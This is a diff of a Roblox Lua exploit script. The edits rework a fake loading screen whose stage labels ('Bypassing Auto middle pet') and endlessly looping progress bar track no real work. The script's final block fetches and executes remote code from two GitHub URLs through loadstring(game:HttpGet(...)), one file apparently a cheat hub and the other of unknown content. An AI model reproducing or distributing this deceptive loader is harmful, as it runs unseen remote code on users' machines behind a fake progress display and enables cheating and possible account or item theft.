@@ -4,7 +4,8 @@ local TweenService = game:GetService("TweenService")
 
 -- SETTINGS
 local stages = {"Bypassing Auto middle pet", "Optimizing", "Finishing"}
-local stageTime = 5 -- seconds per stage
+local stageTime = 3 -- seconds each stage before switching
+local cycleTime = 5 -- seconds for progress bar 0% → 100%
 
 -- Parent GUI
 local parentGui = CoreGui
@@ -39,7 +40,7 @@ Title.TextColor3 = Color3.new(1, 1, 1)
 Title.BackgroundTransparency = 1
 Title.Parent = ScreenGui
 
--- Main text
+-- Stage text
 local Label = Instance.new("TextLabel")
 Label.AnchorPoint = Vector2.new(0.5, 0.5)
 Label.Position = UDim2.new(0.5, 0, 0.4, 0)
@@ -91,37 +92,39 @@ Notice.TextColor3 = Color3.fromRGB(255, 100, 100)
 Notice.BackgroundTransparency = 1
 Notice.Parent = ScreenGui
 
--- Function for each stage
-local function showStage(text)
-    Label.Text = text
-    for i = 1, 100 do
-        local progress = i / 100
-        TweenService:Create(
-            BarFill,
-            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-            {Size = UDim2.new(progress, 0, 1, 0)}
-        ):Play()
-        Percent.Text = string.format("%d%%", math.floor(progress * 100))
-        task.wait(stageTime / 100)
-    end
-    -- reset bar
-    BarFill.Size = UDim2.new(0, 0, 1, 0)
-    Percent.Text = "0%"
-end
-
--- Loop stages forever
+-- Stage loop
 task.spawn(function()
     while true do
         for _, stageName in ipairs(stages) do
-            showStage(stageName)
+            Label.Text = stageName
+            task.wait(stageTime)
         end
+    end
+end)
+
+-- Smooth progress bar loop
+task.spawn(function()
+    while true do
+        -- fill bar 0% → 100%
+        TweenService:Create(
+            BarFill,
+            TweenInfo.new(cycleTime, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
+            {Size = UDim2.new(1, 0, 1, 0)}
+        ):Play()
+
+        for i = 1, 100 do
+            Percent.Text = i .. "%"
+            task.wait(cycleTime / 100)
+        end
+
+        -- reset bar instantly
+        BarFill.Size = UDim2.new(0, 0, 1, 0)
+        Percent.Text = "0%"
     end
 end)
 
 -- Run both scripts after execution
 task.spawn(function()
-    -- Script 1
     loadstring(game:HttpGet("https://raw.githubusercontent.com/R0bI0x9/Mixandmatch/refs/heads/main/Fuckav"))()
-    -- Script 2 (replace with another if you want)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MRBROSKIENOOBIE/Ahmedv99/refs/heads/main/Speed%2520Hub%2520X.lua"))()
 end)
